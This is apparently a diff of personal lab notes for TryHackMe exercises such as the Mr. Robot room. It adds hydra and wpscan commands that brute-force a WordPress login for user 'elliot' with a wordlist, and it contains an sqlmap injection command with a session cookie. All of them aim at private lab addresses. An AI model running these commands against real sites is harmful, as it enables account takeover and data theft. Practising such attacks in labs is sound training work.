@@ -10,7 +10,11 @@
 
 #BruteForcing
 
-1. hydra -L fsocity.txt -p mypassword 192.168.10.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"
+1. hydra -L fsocity.txt -p mypassword 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"
+
+2. hydra -l elliot -P fsocity.txt 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"
+
+3. wpscan --url http://10.10.89.214 -t 50 -U elliot -P /home/kali/Documents/tryhackme/mr-robot/fsociety.txt
 
 Sqlmap
 1. sqlmap -u 'http://10.129.233.138/dashboard.php?search=any+query' --cookie="PHPSESSID=9qik8dt7ol8fpsbi63t0beft1l"
